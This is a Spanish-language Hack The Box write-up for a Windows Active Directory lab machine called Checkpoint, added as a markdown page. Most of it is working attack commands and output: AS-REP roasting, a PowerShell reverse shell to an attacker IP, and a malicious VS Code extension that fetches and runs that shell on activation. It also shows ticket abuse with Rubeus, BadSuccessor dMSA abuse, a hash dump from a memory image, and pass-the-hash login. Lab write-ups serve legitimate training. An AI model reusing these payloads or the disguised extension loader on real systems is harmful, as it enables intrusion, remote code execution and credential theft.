@@ -1,0 +1,569 @@
+---
+title: Checkpoint
+description: Máquina Windows de dificultad media
+tags: [hackthebox, windows]
+draft: true
+lang: es
+parent: writeups/hackthebox/machines
+featured: false
+image: ../../../../../images/writeups/hackthebox/checkpoint/checkpoint.png
+difficulty: medium
+platform: htb
+os: linux
+hints: []
+translationId: checkpoint
+---
+
+<div style="display: flex; justify-content: center;">
+
+![Cap](@images/writeups/hackthebox/checkpoint/checkpoint.png)
+
+</div>
+
+<div style="text-align: center;">
+
+[https://app.hackthebox.com/machines/Checkpoint](https://app.hackthebox.com/machines/Checkpoint)
+
+</div>
+
+```plaintext
+Username: alex.turner
+Password: Checkpoint2024!
+```
+
+## Enumeration
+
+Escanear todos los puertos para ver cuales están abiertos
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/checkpoint 10.129.13.178
+```
+
+```plaintext
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49668/tcp open  unknown          syn-ack ttl 127
+49670/tcp open  unknown          syn-ack ttl 127
+49673/tcp open  unknown          syn-ack ttl 127
+49674/tcp open  unknown          syn-ack ttl 127
+49683/tcp open  unknown          syn-ack ttl 127
+49700/tcp open  unknown          syn-ack ttl 127
+49713/tcp open  unknown          syn-ack ttl 127
+```
+
+```bash
+nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49670,49673,49674,49683,49700,49713 -sCV -Pn -oA nmap/openPorts 10.129.13.178
+```
+
+```plaintext
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-14 03:51:00Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf            .NET Message Framing
+49664/tcp open  msrpc             Microsoft Windows RPC
+49668/tcp open  msrpc             Microsoft Windows RPC
+49670/tcp open  msrpc             Microsoft Windows RPC
+49673/tcp open  msrpc             Microsoft Windows RPC
+49674/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49683/tcp open  msrpc             Microsoft Windows RPC
+49700/tcp open  msrpc             Microsoft Windows RPC
+49713/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2026-06-14T03:51:52
+|_  start_date: N/A
+|_clock-skew: 6h59m44s
+```
+
+```bash
+smbclient -L //10.129.13.178 -U 'alex.turner%Checkpoint2024!'
+```
+
+```plaintext
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	DevDrop         Disk      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share
+	SYSVOL          Disk      Logon server share
+	VMBackups       Disk
+```
+
+## Exploitation
+
+```bash
+bloodyAD -u 'alex.turner' -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.14.215 get search --base "CN=Deleted Objects,DC=checkpoint,DC=htb" --filter "(objectClass=user)" -c 1.2.840.113556.1.4.417 --attr sAMAccountName,userAccountControl
+```
+
+```plaintext
+distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
+sAMAccountName: mark.davies
+userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
+```
+
+```bash
+bloodyAD -u 'alex.turner' -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.14.215 set restore mark.davies
+```
+
+```plaintext
+[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
+```
+
+```bash
+GetNPUsers.py checkpoint.htb/mark.davies -no-pass -dc-ip 10.129.14.215 -format hashcat
+```
+
+```plaintext
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Getting TGT for mark.davies
+[-] User mark.davies doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+```bash
+bloodyAD -u 'alex.turner' -p 'Checkpoint2024!' -d checkpoint.htb --host 10.129.14.215 set object mark.davies userAccountControl -v 4260352
+```
+
+```plaintext
+[+] mark.davies's userAccountControl has been updated
+```
+
+```bash
+GetNPUsers.py checkpoint.htb/mark.davies -no-pass -dc-ip 10.129.14.215 -format hashcat
+```
+
+```plaintext
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Getting TGT for mark.davies
+$krb5asrep$18$mark.davies$CHECKPOINT.HTB$7ca1bfbfa133e1aff5ece3ff$eb9c8a807f23d596a4aaef69aeb99eafeb5351194a3d7932a842b2c5d1bb7ac76730840d89d55c267a2aac30ffbbcf065ccd2e3ffe10f55b39360f6cc0299a9f716e346b078c1b943f85841abc26a3b38d1651e18e794b9c0a63e5d37b79ffcd78ec6f6c494a2ae95e5657dfc00bf00ec169b4114fa94603e34d0d114e8836abb54e675b4da1afbe908e49da33968f5f45ff3ddb5766c4cff14479f33b9798b02509f10c0c4f2ed5dc3fa4150e1b23796f4f6cd513723fc67bd22b3e123e0a0dd8a4ef9ba0d1aeb4050143881f9fed0e81aacf65d9bef15e181fc0261b795a7368e2c92654d448c8a49bd429451d9b7c709608920e08edc8
+```
+
+```bash
+hashcat --identify mark.hash
+```
+
+```plaintext
+The following hash-mode match the structure of your input hash:
+
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+  32200 | Kerberos 5, etype 18, AS-REP                               | Network Protocol
+
+```
+
+```bash
+hashcat -m 32200 mark.hash -a 3 Checkpoint202?d?s
+```
+
+```plaintext
+$krb5asrep$18$mark.davies$CHECKPOINT.HTB$7ca1bfbfa133e1aff5ece3ff$eb9c8a807f23d596a4aaef69aeb99eafeb5351194a3d7932a842b2c5d1bb7ac76730840d89d55c267a2aac30ffbbcf065ccd2e3ffe10f55b39360f6cc0299a9f716e346b078c1b943f85841abc26a3b38d1651e18e794b9c0a63e5d37b79ffcd78ec6f6c494a2ae95e5657dfc00bf00ec169b4114fa94603e34d0d114e8836abb54e675b4da1afbe908e49da33968f5f45ff3ddb5766c4cff14479f33b9798b02509f10c0c4f2ed5dc3fa4150e1b23796f4f6cd513723fc67bd22b3e123e0a0dd8a4ef9ba0d1aeb4050143881f9fed0e81aacf65d9bef15e181fc0261b795a7368e2c92654d448c8a49bd429451d9b7c709608920e08edc8:Checkpoint2024!
+```
+
+```bash
+nxc smb 10.129.14.215 -u 'alex.turner' -p 'Checkpoint2024!' --pass-pol
+```
+
+```plaintext
+SMB         10.129.14.215   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB         10.129.14.215   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
+SMB         10.129.14.215   445    DC01             [+] Dumping password info for domain: CHECKPOINT
+SMB         10.129.14.215   445    DC01             Minimum password length: 7
+SMB         10.129.14.215   445    DC01             Password history length: 24
+SMB         10.129.14.215   445    DC01             Maximum password age: 41 days 23 hours 53 minutes
+SMB         10.129.14.215   445    DC01
+SMB         10.129.14.215   445    DC01             Password Complexity Flags: 000001
+SMB         10.129.14.215   445    DC01                 Domain Refuse Password Change: 0
+SMB         10.129.14.215   445    DC01                 Domain Password Store Cleartext: 0
+SMB         10.129.14.215   445    DC01                 Domain Password Lockout Admins: 0
+SMB         10.129.14.215   445    DC01                 Domain Password No Clear Change: 0
+SMB         10.129.14.215   445    DC01                 Domain Password No Anon Change: 0
+SMB         10.129.14.215   445    DC01                 Domain Password Complex: 1
+SMB         10.129.14.215   445    DC01
+SMB         10.129.14.215   445    DC01             Minimum password age: 1 day 4 minutes
+SMB         10.129.14.215   445    DC01             Reset Account Lockout Counter: 10 minutes
+SMB         10.129.14.215   445    DC01             Locked Account Duration: 10 minutes
+SMB         10.129.14.215   445    DC01             Account Lockout Threshold: None
+SMB         10.129.14.215   445    DC01             Forced Log off Time: Not Set
+```
+
+```bash
+nxc smb 10.129.14.215 -u 'mark.davies' -p 'Checkpoint2024!' --shares
+```
+
+```plaintext
+SMB         10.129.14.215   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB         10.129.14.215   445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
+SMB         10.129.14.215   445    DC01             [*] Enumerated shares
+SMB         10.129.14.215   445    DC01             Share           Permissions     Remark
+SMB         10.129.14.215   445    DC01             -----           -----------     ------
+SMB         10.129.14.215   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.14.215   445    DC01             C$                              Default share
+SMB         10.129.14.215   445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+SMB         10.129.14.215   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.14.215   445    DC01             NETLOGON        READ            Logon server share
+SMB         10.129.14.215   445    DC01             SYSVOL          READ            Logon server share
+SMB         10.129.14.215   445    DC01             VMBackups
+```
+
+`rev.ps1`
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.59',1111);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+```bash
+python3 -m http.server
+```
+
+```bash
+nc -lnvp 1111
+```
+
+`package.json`
+
+```json
+{
+  "name": "malicious-update",
+  "displayName": "System Update Utility",
+  "version": "1.0.0",
+  "publisher": "checkpoint",
+  "engines": {
+    "vscode": "^1.118.0"
+  },
+  "activationEvents": ["*"],
+  "main": "./extension.js"
+}
+```
+
+`extension.js`
+
+```javascript
+const vscode = require("vscode");
+const cp = require("child_process");
+
+function activate(context) {
+  const payload =
+    "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.59:8000/rev.ps1')\"";
+
+  cp.exec(payload, (err, stdout, stderr) => {
+    if (err) {
+      return;
+    }
+  });
+}
+
+function deactivate() {}
+
+module.exports = {
+  activate,
+  deactivate,
+};
+```
+
+```bash
+npm install -g @vscode/vsce
+```
+
+```bash
+npm init -y
+```
+
+```bash
+vsce package --allow-missing-repository --allow-star-activation
+```
+
+```bash
+smbclient //10.129.14.215/DevDrop -U 'mark.davies%Checkpoint2024!'
+```
+
+```plaintext
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Try "help" to get a list of possible commands.
+smb: \> put malicious-update-1.0.0.vsix
+putting file malicious-update-1.0.0.vsix as \malicious-update-1.0.0.vsix (3.5 kB/s) (average 3.5 kB/s)
+```
+
+```powershell
+Get-ChildItem C:\Users\ryan.brooks\Desktop\
+```
+
+```plaintext
+    Directory: C:\Users\ryan.brooks\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         6/14/2026   3:21 PM             34 user.txt
+```
+
+```powershell
+Get-Content C:\Users\ryan.brooks\Desktop\user.txt
+```
+
+### User flag
+
+<Callout type="success" title="User flag">
+  7c9**************************cfb
+</Callout>
+
+## Privilege Escalation
+
+```bash
+wget "http://10.10.14.59:8000/Rubeus.exe" -OutFile "C:\Users\ryan.brooks\Desktop\Rubeus.exe"
+```
+
+```powershell
+.\Rubeus.exe tgtdeleg /nowrap
+```
+
+```plaintext
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+
+[*] Action: Request Fake Delegation TGT (current user)
+
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
+[+] Kerberos GSS-API initialization success!
+[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: J2PnD2sNMuXpNSTtvcKYLBp475ROvo7so54/N33uuO8=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuMiDEnykt5+WOt9TFzCI3CFCnauPR58Cskve/+IAo0BEPsWN5v6AWOcvrrcoZ7DH69sP1mKFp2YFOcRqqbyU4I2ebnvWW2nz2v8Wy4FZW+T82vQQ+9ccPF8xyRfBwEg7KcIxR2HL1FPXvxWFewMJPO23urb58ByQtwgzYO8N83hrIMkrsDuHR1BDyGUQOwYW5a18T+7dV0D5uBTLSGA4ze2E9KD0he5Spkc54L9JXJ8oVoM51xk3SCM76MK+ymWt3i1Zp/f1fEXip/Vk2wmNB2V0X1LaSEgWqs3Da3FOTL+xG/z8zMyPKi3rI3ytSfxP/pkpk3tseXj9QVIfDddD1JTIwUphkvpSRN/qnMuVm4sO/tQJcxg0vy1BMgNH2NYBnmAzmkjYeFPxDXNcGVmQqCtegJd0kwtcIc8ns1Y5OaSf3W8Ss/8rKFouvn2tyFKIk/aHCQWn2X70GREYdxbJW3VUB60tQikW7dcpgjuZhPWVkGEOmZZTeDFGMqYcAQAyhbIim9/QV0dIRWZvu1FVKH8JX2rJ+QNWjAfHmYpvDRB15RIdy7U+wluaMeIwUA3vQGZftuXccouXQP7vHPdb7sVzSdrqbgfoHLve++KBCtBH0L35vmffqwqeprZUdIOUK27SYcLQFCtxjHTi8X6l8kyFcyB+B3NDLi5oUa6T5lH+VevSYeuJq9KOhz1Qz+y4qWunddGi57b2AnZoEaht2estljqKRjLtWNd6EJoSgt/ySH31Gqg5F/GXkZ76jBvcoGlKHs2utpe65jVAqC1KwB9/jWzS9GY87ISl5QNRgzQp1/8O5wsIMmyEgiTRNP4OkItNBgJvbZcqXLKlnU0gqnOG4aGjnT2RNbn0fzyPbB8GSLdaA5rBBhsbGlLQzPvLNGBlcWzZkLOJh2euLsYQDvLcy7t1kZquI1MnaeFGU2SxkP0yLOIv4W3d8Lw8zwlyZ/rE3ZPshAvXPJIZRmC6o0rXwafz6UXryHfj5UHprxn+V3S76OzcI5a/EoFL35DMFJymS7pbYaSEw6Cq28VbpELhzqk1mo8VeiQYEQ95ZnTOf/TFS/q2Lx77wNVe+K0av3tGxKzfc5Zeb4t4D4XOG4Qd254yJnn8uEETrqvssAVifCfk9DwIcHo/5CSz2/ngqr9HRrwYRyLd2P7EBcDvvBpqda8ZkEI1XMLTotetocfXvb3u6PkkTUAaZbPwfKSPoq/zUCdyGsGS4InjkNend2sxogAX9ZXkH01TAfuR/EQRkit4bCBZm+l2+g2X1do7oxqf7d8ghVZh5L7c/fEquIw5fsCZFHxLdilxRt8B5Hr4fc+PmXAqzh9Sbr3S6rEss7F1NHKG4JiLjz+jVvgdYQio6u5BQQyZ+an/uY7o2FkezCvvIyAQeIHIKtXe5qva0k3wVGVGcnW9eDRMYN5BosCar28xSrJjS8iTFBsTtsuCEKbfE+MZfdtdiOuGxz02rZO+4C9byRj6TG1rVAqZ4OytwPNjV9unVN4h5AKeWo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg1yMjWc8Q82pLkvwrEZ6ZDXyS+QtINTtxmxW1bAl6q9uhEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYxNjEwMDUyNlqmERgPMjAyNjA2MTYyMDA1MjZapxEYDzIwMjYwNjIzMTAwNTI2WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
+```
+
+```bash
+bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=/home/melvin/hckng/htb/machines/Checkpoint/ryan.ccache add badSuccessor evil-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
+```
+
+```plaintext
+Clock skew detected. Adjusting local time by 6:59:58.234639. Retrying operation.
+[+] Creating DMSA evil-dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
+[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB
+Clock skew detected. Adjusting local time by 6:59:57.902348. Retrying operation.
+
+Realm        : CHECKPOINT.HTB
+Sname        : krbtgt/CHECKPOINT.HTB
+UserName     : evil-dmsa$
+UserRealm    : checkpoint.htb
+StartTime    : 2026-06-16 10:07:33+00:00
+EndTime      : 2026-06-16 20:05:26+00:00
+RenewTill    : 2026-06-23 10:05:26+00:00
+Flags        : forwarded, forwardable, enc-pa-rep, renewable, pre-authent
+Keytype      : 18
+Key          : 3gcEApghybg2Ko4rLp/GQPmi9FlcIMP0CZHlLLlXNFo=
+EncodedKirbi :
+
+    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
+    Q0tQT0lOVC5IVEI=
+[+] dMSA TGT stored in ccache file evil-dmsa_Ud.ccache
+
+dMSA current keys found in TGS:
+AES256: afdc5f548f8f53a95d2e8199e975480d7bc297ad8d84b8e309b71851cf52a24e
+AES128: e7ca14db4430d373a72581b4418267c2
+RC4: c6ed1d86147aa91523332101853ad41a
+
+dMSA previous keys found in TGS (including keys of preceding managed accounts):
+RC4: e16081eb077aca74bdbf8af12af43ac9
+```
+
+```bash
+nxc smb 10.129.16.7 -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
+```
+
+```bash
+smbclient //10.129.16.7/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash
+```
+
+```plaintext
+smb: \> ls
+  .                                   D        0  Sat May  9 14:15:22 2026
+  ..                                  D        0  Sat May  9 11:42:27 2026
+  NightlyBackup_2024-11-01            D        0  Sat May  9 13:54:19 2026
+
+		10459391 blocks of size 4096. 2448012 blocks available
+smb: \> cd NightlyBackup_2024-11-01\
+smb: \NightlyBackup_2024-11-01\> ls
+  .                                   D        0  Sat May  9 13:54:19 2026
+  ..                                  D        0  Sat May  9 14:15:22 2026
+  memory forensics                    D        0  Sat May  9 14:12:44 2026
+
+		10459391 blocks of size 4096. 2448008 blocks available
+smb: \NightlyBackup_2024-11-01\> cd "memory forensics"
+smb: \NightlyBackup_2024-11-01\memory forensics\> ls
+  .                                   D        0  Sat May  9 14:12:44 2026
+  ..                                  D        0  Sat May  9 13:54:19 2026
+  Windows Server 2019-000001.vmdk      A 106496000  Sat May  9 23:45:22 2026
+  Windows Server 2019-Snapshot1.vmem      A 2147483648  Sat May  9 23:40:36 2026
+  Windows Server 2019-Snapshot1.vmsn      A 138164859  Sat May  9 23:40:36 2026
+  Windows Server 2019.nvram           A   270840  Sat May  9 23:39:00 2026
+  Windows Server 2019.scoreboard      A     7642  Sat May  9 23:45:22 2026
+  Windows Server 2019.vmdk            A 10199695360  Sat May  9 23:39:00 2026
+  Windows Server 2019.vmsd            A      502  Sat May  9 23:39:00 2026
+  Windows Server 2019.vmx             A     2749  Sat May  9 23:45:22 2026
+  Windows Server 2019.vmxf            A      274  Sat May  9 23:22:44 2026
+
+		10459391 blocks of size 4096. 2448005 blocks available
+smb: \NightlyBackup_2024-11-01\memory forensics\> prompt off
+smb: \NightlyBackup_2024-11-01\memory forensics\> get "Windows Server 2019-Snapshot1.vmem"
+getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem of size 2147483648 as Windows Server 2019-Snapshot1.vmem (4431.3 KiloBytes/sec) (average 4431.3 KiloBytes/sec)
+```
+
+```bash
+venv/bin/vol -q -f "Windows Server 2019-Snapshot1.vmem" windows.info.Info
+```
+
+```plaintext
+Volatility 3 Framework 2.28.0
+WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same directory with the same file name, e.g. Windows%20Server%202019-Snapshot1.vmem and Windows%20Server%202019-Snapshot1.vmss.
+
+Variable	Value
+
+Kernel Base	0xf80725608000
+DTB	0x1ad000
+Symbols	file:///home/melvin/hckng/htb/machines/Checkpoint/venv/lib/python3.14/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/EF9A48AFA50FF07C616585BB01919536-1.json.xz
+Is64Bit	True
+IsPAE	False
+layer_name	0 WindowsIntel32e
+memory_layer	1 FileLayer
+KdVersionBlock	0xf80725a08f10
+Major/Minor	15.17763
+MachineType	34404
+KeNumberProcessors	2
+SystemTime	2026-05-09 14:08:58+00:00
+NtSystemRoot	C:\Windows
+NtProductType	NtProductServer
+NtMajorVersion	10
+NtMinorVersion	0
+PE MajorOperatingSystemVersion	10
+PE MinorOperatingSystemVersion	0
+PE Machine	34404
+PE TimeDateStamp	Sun Nov 10 07:20:39 2075
+```
+
+```bash
+venv/bin/vol -q -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump.Hashdump
+```
+
+```plaintext
+Volatility 3 Framework 2.28.0
+WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same directory with the same file name, e.g. Windows%20Server%202019-Snapshot1.vmem and Windows%20Server%202019-Snapshot1.vmss.
+/home/melvin/hckng/htb/machines/Checkpoint/venv/lib/python3.14/site-packages/volatility3/framework/deprecation.py:28: FutureWarning: This API (volatility3.plugins.windows.registry.hashdump.Hashdump.run) will be removed in the first release after 2026-09-25. This plugin has been renamed, please call volatility3.plugins.windows.registry.hashdump.Hashdump rather than volatility3.plugins.windows.hashdump.Hashdump.
+  warnings.warn(
+
+User	rid	lmhash	nthash
+/home/melvin/hckng/htb/machines/Checkpoint/venv/lib/python3.14/site-packages/volatility3/framework/deprecation.py:105: FutureWarning: This plugin (volatility3.plugins.windows.hashdump.Hashdump) has been renamed and will be removed in the first release after 2026-09-25. Please ensure all method calls to this plugin are replaced with calls to volatility3.plugins.windows.registry.hashdump.Hashdump
+  warnings.warn(
+
+Administrator	500	aad3b435b51404eeaad3b435b51404ee	f29e9c014295b9b32139b09a2790be3b
+Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+DefaultAccount	503	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+WDAGUtilityAccount	504	aad3b435b51404eeaad3b435b51404ee	28f8d934dee90b2ec824351cb0844479
+```
+
+```bash
+evil-winrm -i 10.129.16.7 -u administrator -H f29e9c014295b9b32139b09a2790be3b
+```
+
+```plaintext
+Evil-WinRM shell v3.9
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:\Users
+*Evil-WinRM* PS C:\Users> dir
+
+    Directory: C:\Users
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         5/25/2026   6:26 PM                Administrator
+d-----         5/25/2026   6:34 PM                max.palmer
+d-r---          5/9/2026  12:30 AM                Public
+d-----         5/21/2026   4:19 PM                ryan.brooks
+
+
+*Evil-WinRM* PS C:\Users> cd max.palmer
+*Evil-WinRM* PS C:\Users\max.palmer> cd Desktop
+*Evil-WinRM* PS C:\Users\max.palmer\Desktop> dir
+
+    Directory: C:\Users\max.palmer\Desktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         6/15/2026  11:00 PM             34 root.txt
+
+*Evil-WinRM* PS C:\Users\max.palmer\Desktop> type root.txt
+```
